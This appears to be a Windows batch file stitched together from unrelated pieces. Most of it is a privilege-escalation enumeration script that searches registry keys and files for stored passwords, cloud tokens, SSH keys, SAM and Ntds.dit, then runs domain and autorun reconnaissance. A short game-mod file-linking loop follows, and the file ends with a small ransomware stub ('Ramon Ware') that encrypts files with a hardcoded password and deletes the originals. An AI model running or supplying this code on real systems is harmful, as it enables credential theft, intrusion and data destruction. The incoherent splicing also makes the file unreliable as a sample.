echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] McAffe SiteList.xml ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
cd %ProgramFiles% 2>nul
dir /s SiteList.xml
cd %ProgramFiles(x86)% 2>nul
dir /s SiteList.xml
cd "%windir%\..\Documents and Settings" 2>nul
dir /s SiteList.xml
cd %windir%\..\Users 2>nul
dir /s SiteList.xml
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] GPP Password ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
cd "%SystemDrive%\Microsoft\Group Policy\history"
dir /s/b Groups.xml == Services.xml == Scheduledtasks.xml == DataSources.xml == Printers.xml == Drives.xml
cd "%windir%\..\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history"
dir /s/b Groups.xml == Services.xml == Scheduledtasks.xml == DataSources.xml == Printers.xml == Drives.xml
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Cloud Creds ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
cd "%SystemDrive%\Users"
dir /s/b .aws == credentials == gcloud == credentials.db == legacy_credentials == access_tokens.db == .azure == accessTokens.json == azureProfile.json
cd "%windir%\..\Documents and Settings"
dir /s/b .aws == credentials == gcloud == credentials.db == legacy_credentials == access_tokens.db == .azure == accessTokens.json == azureProfile.json
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] AppCmd ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
IF EXIST %systemroot%\system32\inetsrv\appcmd.exe ECHO %systemroot%\system32\inetsrv\appcmd.exe exists. 
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Files an registry that may contain credentials ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Searching specific files that may contains credentials.
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
echo Looking inside HKCU\Software\ORL\WinVNC3\Password
reg query HKCU\Software\ORL\WinVNC3\Password 2>nul
echo Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password 2>nul
echo Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
echo Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s 2>nul
echo Looking inside HKCU\Software\TightVNC\Server
reg query HKCU\Software\TightVNC\Server 2>nul
echo Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s 2>nul
echo Looking inside HKCU\Software\OpenSSH\Agent\Keys
reg query HKCU\Software\OpenSSH\Agent\Keys /s 2>nul
cd %USERPROFILE% 2>nul && dir /s/b *password* == *credential* 2>nul
cd ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..
dir /s/b /A:-D RDCMan.settings == *.rdg == SCClient.exe == *_history == .sudo_as_admin_successful == .profile == *bashrc == httpd.conf == *.plan == .htpasswd == .git-credentials == *.rhosts == hosts.equiv == Dockerfile == docker-compose.yml == appcmd.exe == TypedURLs == TypedURLsTime == History == Bookmarks == Cookies == "Login Data" == places.sqlite == key3.db == key4.db == credentials == credentials.db == access_tokens.db == accessTokens.json == legacy_credentials == azureProfile.json == unattend.txt == access.log == error.log == *.gpg == *.pgp == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12 == *.der == *.csr == *.cer == known_hosts == id_rsa == id_dsa == *.ovpn == anaconda-ks.cfg == hostapd.conf == rsyncd.conf == cesi.conf == supervisord.conf == tomcat-users.xml == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == unattend.xml == unattended.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == groups.xml == services.xml == scheduledtasks.xml == printers.xml == drives.xml == datasources.xml == php.ini == https.conf == https-xampp.conf == httpd.conf == my.ini == my.cnf == access.log == error.log == server.xml == SiteList.xml == ConsoleHost_history.txt == setupinfo == setupinfo.bak 2>nul | findstr /v ".dll"
cd inetpub 2>nul && (dir /s/b web.config == *.log & cd ..)
echo.
echo.
if "%long%" == "yes" (
    echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] REGISTRY WITH STRING pass OR pwd ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
	reg query HKLM /f passw /t REG_SZ /s
	reg query HKCU /f passw /t REG_SZ /s
	reg query HKLM /f pwd /t REG_SZ /s
	reg query HKCU /f pwd /t REG_SZ /s
	echo.
	echo.
	echo [i] Iterating through the drives
	echo.
	for /f %%x in ('wmic logicaldisk get name^| more') do (
		set tdrive=%%x
		if "!tdrive:~1,2!" == ":" (
			%%x
            echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] FILES THAT CONTAINS THE WORD PASSWORD WITH EXTENSION: .xml .ini .txt *.cfg *.config ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
	        findstr /s/n/m/i password *.xml *.ini *.txt *.cfg *.config 2>nul | findstr /v /i "\\AppData\\Local \\WinSxS ApnDatabase.xml \\UEV\\InboxTemplates \\Microsoft.Windows.Cloud \\Notepad\+\+\\ vmware cortana alphabet \\7-zip\\" 2>nul
            echo.
            echo.
            echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] FILES WHOSE NAME CONTAINS THE WORD PASS CRED or .config not inside \Windows\ ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
            dir /s/b *pass* == *cred* == *.config* == *.cfg 2>nul | findstr /v /i "\\windows\\"  
            echo.
            echo.
		)
	)
	echo.
)
net user Administrator /domain
net Accounts
net localgroup administrators
net use
net share
net group "domain admins" /domain
net config workstation
net accounts
net accounts /domain
net view
sc.exe query
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
wmic useraccount list
wmic useraccount get /ALL
wmic startup list brief
wmic share list
wmic service get name,displayname,pathname,startmode
wmic process list brief
wmic process get caption,executablepath,commandline
wmic qfe get description,installedOn /format:csv
arp -a
whoami
ipconfig /displaydns
route print
netsh advfirewall show allprofiles
systeminfo
qwinsta
FOR /f "delims=" %%g in ('dir /a:d-h /b') do ( 
	IF /I NOT %%g==release ( 
    	IF /I NOT %%g==master_docs (
    		del %%g\description.ext
    		::timeout 1
		    mklink /h %%g\description.ext master_docs\description.ext
		    del %%g\initServer.sqf
		    ::timeout 1
		    mklink /h %%g\initServer.ext master_docs\initServer.sqf
		    del %%g\160_ace_config.hpp
		    ::timeout 1
		    mklink /h %%g\160_ace_config.hpp master_docs\160_ace_config.hpp
		    del %%g\initplayerserver.sqf
		    ::timeout 1
		    mklink /h %%g\initplayerserver.sqf master_docs\initplayerserver.sqf
    	)
    )
) 
mode con:cols=50 lines=2
set pass=SegoCode

Title Ramon Ware

echo Scanning. . . .
REM Change file extension *.123test for *.doc
FOR /R "%homedrive%\" %%X in (*.123test) DO (
REM echo %%X >> %homedrive%\Original.txt SafeMode
REM Rename "%%X" "%%~nX.bak" >NUL 2>&1 SafeMode   
aescrypt -e -p %pass% "%%X"
del "%%X"
)
